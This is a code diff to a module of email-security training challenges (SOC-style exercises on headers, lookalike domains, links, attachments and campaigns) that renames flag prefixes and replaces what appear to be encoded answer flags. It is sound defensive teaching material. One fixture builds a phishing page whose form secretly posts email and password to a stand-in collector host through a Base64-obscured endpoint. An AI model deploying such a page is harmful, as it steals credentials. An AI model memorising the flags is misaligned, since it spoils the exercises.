@@ -358,8 +358,8 @@ export default {
       skills: ['Received headers', 'reading headers'],
       prepare: ['email-anatomy'],
       brief: 'A supplier says they never sent the "urgent payment update" email that accounts received this morning. The message went through four mail servers before reaching Larkfield. The police contact on the case wants one thing: the address of the computer it was first sent from.',
-      goal: 'Find the IP address in the earliest Received header, the one closest to the sender, and submit `HW{address}`.',
-      flag: 'jfXrQuZN8mQLQUwcckLAKvRt',
+      goal: 'Find the IP address in the earliest Received header, the one closest to the sender, and submit `SOC{address}`.',
+      flag: '8beXBH711dvg82fCyvhNN1e0NA==',
       workspace: () => ({
         type: 'mail',
         messages: [message({
@@ -391,8 +391,8 @@ export default {
       skills: ['Authentication-Results', 'DMARC', 'Received headers'],
       prepare: ['email-auth'],
       brief: 'Larkfield\'s payroll provider, PayHarbor, sends payslip notifications every month from `payharbor.example`. Four arrived today and they look identical. Three are real. One is not, and it was delivered by a server that has nothing to do with PayHarbor.',
-      goal: 'Find the message that fails authentication and submit the IP address of the server that delivered it to Larkfield (the top Received header) as `HW{address}`.',
-      flag: '8ExunC54yWR33yGrJfh1',
+      goal: 'Find the message that fails authentication and submit the IP address of the server that delivered it to Larkfield (the top Received header) as `SOC{address}`.',
+      flag: 'FAYiq6/WOEwP+S4QWdFaKw==',
       workspace: () => {
         const r = random(77);
         const real = (i, minute) => message({
@@ -427,8 +427,8 @@ export default {
       skills: ['lookalike domains', 'punycode', 'homoglyphs'],
       prepare: ['email-lookalikes'],
       brief: 'Ten messages arrived claiming to be from Larkfield or its suppliers. Several use lookalike domains of different kinds. One of them uses a domain that looks exactly like `larkfield.example` on screen, letter for letter, and that is the one the CISO wants added to every block list first.',
-      goal: 'Find the sender domain that displays identically to `larkfield.example` and submit it in the form it appears in the raw headers, as `HW{domain}`.',
-      flag: 'GmO9P5SJS0RM6699RXEMpkN2KSgic/p1v/FK0A==',
+      goal: 'Find the sender domain that displays identically to `larkfield.example` and submit it in the form it appears in the raw headers, as `SOC{domain}`.',
+      flag: 'FnW9Rs5VzUAOdg9cvZoFOS5J9VfBBzxyWHrAbM8=',
       workspace: () => {
         // [display name, address, real Larkfield or supplier?, subject]
         const senders = [
@@ -472,8 +472,8 @@ Details are on the intranet.`
       skills: ['HTML links', 'URL anatomy', 'registered domains'],
       prepare: ['email-links'],
       brief: 'A convincing "shared document" notification has three links in it. Two of them really do go to Larkfield. One goes somewhere else, behind link text and a host name that both mention Larkfield. If anyone typed their password into it, you need the domain to search the proxy logs for.',
-      goal: 'Find the link that does not go to Larkfield and submit its registered domain as `HW{domain}`.',
-      flag: 'FLYPnY+gZJldn7NakJux9vAitj6u',
+      goal: 'Find the link that does not go to Larkfield and submit its registered domain as `SOC{domain}`.',
+      flag: 'QOkpfiNqBvaUF5JCZdxmi8mQliZ5BQ==',
       workspace: () => ({
         type: 'mail',
         messages: [message({
@@ -500,8 +500,8 @@ Details are on the intranet.`
       skills: ['attachments', 'file signatures', 'Base64', 'HTML attachments'],
       prepare: ['email-attachments', 'email-links'],
       brief: 'An email with a "remittance advice" attachment was reported by the finance team. The attachment claims to be a PDF. Opening it on a workstation is out of the question, but you still need to know where it would send anyone who did open it.',
-      goal: 'Examine the attachment without opening it, find the address its form would send data to, and submit that host\'s registered domain as `HW{domain}`.',
-      flag: 'sjeOJDodMv1K5zfot/YMyGhL8Sm5nzsf',
+      goal: 'Examine the attachment without opening it, find the address its form would send data to, and submit that host\'s registered domain as `SOC{domain}`.',
+      flag: 'vfTkLRQBKE9JhFWfA3A4zjHT4d9Dlys2vQ==',
       workspace: () => {
         const action = toBase64(utf8('https://remit-portal.payfiles-secure.test/collect.php'));
         const page = `<!doctype html>\n<html><head><meta charset="utf-8"><title>Remittance Advice - Document Viewer</title></head>\n<body style="font-family:Arial">\n<h3>Larkfield Document Viewer</h3>\n<p>This document is protected. Sign in with your work email to view it.</p>\n<form id="f" method="post">\n<input name="email" placeholder="Email address">\n<input name="password" type="password" placeholder="Password">\n<button>View document</button>\n</form>\n<script>\n// viewer config\nvar cfg = { theme: "light", pages: 2, endpoint: "${action}" };\ndocument.getElementById("f").action = atob(cfg.endpoint);\n</script>\n</body></html>\n`;
@@ -535,8 +535,8 @@ Details are on the intranet.`
       skills: ['SHA-256', 'threat intelligence', 'attachments'],
       prepare: ['email-attachments'],
       brief: 'The threat intelligence team sent this morning\'s list of known malicious attachment hashes to the SOC mailbox. Since then, five messages with attachments have been reported by staff. Most are harmless. Check each attachment against the list.',
-      goal: 'Find the reported attachment whose SHA-256 is on the intelligence list. Submit the malware family name from the list and the attachment\'s file name as `HW{family_filename}`.',
-      flag: '3IHk7f8MPWee+7QyLPd9y5t8UdF+PQWhe4oQPh1j83Y=',
+      goal: 'Find the reported attachment whose SHA-256 is on the intelligence list. Submit the malware family name from the list and the attachment\'s file name as `SOC{family_filename}`.',
+      flag: 'PhYlU3ybfb9pm2XQ5Z0fbgUJwVbcmWe3nry3I0ieX/XW',
       workspace: () => {
         const files = [
           ['Timesheet_March.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fakeZip('xl/workbook.xml', 11)],
@@ -582,8 +582,8 @@ Details are on the intranet.`
       skills: ['campaign analysis', 'Received headers', 'URL patterns'],
       prepare: ['email-anatomy', 'email-links', 'email-response'],
       brief: 'Staff reported twelve messages this week. The first one is a confirmed credential phish. Attackers rarely send just one message: they vary the sender, subject and wording to get past filters, but they reuse infrastructure. The response team needs to know how big this campaign is so they can purge every copy.',
-      goal: 'Work out which reported messages belong to the same campaign as the first one, counting the first. Submit `HW{count_address}`, where the address is the IP of the server that delivered all of them to Larkfield.',
-      flag: 'ob7ZuwizbBRCSk1ErbDLdLqoDw==',
+      goal: 'Work out which reported messages belong to the same campaign as the first one, counting the first. Submit `SOC{count_address}`, where the address is the IP of the server that delivered all of them to Larkfield.',
+      flag: 'N6sbAOJCcIovpxSw7sOhNHi/acA=',
       workspace: () => {
         const r = random(1212);
         const campaignIp = '203.0.113.177';
